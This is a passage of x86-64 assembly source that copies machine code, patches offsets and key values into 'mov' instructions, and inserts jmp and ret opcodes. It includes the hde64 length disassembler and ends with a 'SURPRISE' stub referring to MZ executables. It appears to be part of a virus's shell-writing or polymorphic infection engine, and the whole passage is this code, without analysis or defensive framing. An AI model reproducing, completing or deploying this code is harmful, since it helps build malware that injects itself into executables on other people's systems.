         sub   rdx, rcx 
         push  rcx
   w_no_ow2:
         cmp   byte[rsi],  0xB8      ;part of opcode 'mov eax, ...'
         je    write_offs
         cmp   byte[rsi],  0xBA      ;opcode 'mov edx, ...'
         je    write_key
         ;rep   movsb
   w_no_ow3:
         movsb
   w_no_ow4:
   loop  w_no_ow2
         pop   rbx
         pop   rax
         cmp   r8, 0
         jle   w_shell_exit
         cmp   rax,  6
         je    w_6
        ; cmp   rbx,  4
        ; jle   wsf_o 
        ; push  4
        ; pop   rbx
      wsf_o:
         mov   rcx,  0xEB           ;near jmp 
         dec   rax
         add   rdi,  rdx
         cmp   dl, 1
         jne   bl_2
         mov   byte[rdi-1], 0x00
         jmp   w_anth
      bl_2:
         cmp   dl, 2
         jne   w_anth 
      bl1_2:
         mov   word[rdi-2], 0x00
         jmp   w_anth
      ;bl_3:
      ;   cmp   bl, 3
      ;   jne   bl_4
      ;   mov   byte[rdi-3], 0x00
      ;   jmp   bl1_2
      ;bl_4:
        ; cmp   bl, 4
        ; jne   w_anth
        ; mov   dword[rdi-4], 0x00
        ; jmp   w_anth
   w_6:
         mov   rcx,  0xE9  ;far jmp
         dec   rax
   w_anth:
         mov   byte[rdi], cl           ;jmp(0xE9/0xEB)
         mov   byte[rdi+rax], 0xC3   ;ret(0xC3)
         inc   rdi
   w_shell_exit:
         ;pop   rbp
         pop   r15
         pop   rdx
         pop   rcx
   ret

   write_offs:
         cmp   dword[rsi+5], 0x48C06348      ;'movsxd rax, eax' + 48
         jne   w_no_ow3
         ;sub   r15,  2        ;sub size of 'pop rsi\n push rdi'
         ;sub   r15,  rdi
         sub   r15,  r13
         movsb
         mov   dword[rdi],   r15d
         sub   cl,   4
         add   rdi,  4
         add   rsi,  4
      jmp   w_no_ow4
   write_key:
         cmp   dword[rsi-8],  0xB9C60148     ;'add rsi, eax' + 0xB9
         jne   w_no_ow3
         movsb
         ;rol   rbp,  12
         mov   dword[rdi],   ebp
         sub   cl,   4
         add   rdi,  4
         add   rsi,  4
      jmp   w_no_ow4
      ;ret
%include       "hde64.asm"
surp:    times 16 db 0xCC
;================================================================================================
;                    SURPRISE
;================================================================================================
_surprise_MZF:
      mov   rax,  3
      mov   rsi,  0x00000000
      mov   rdi,  rsi
   ret
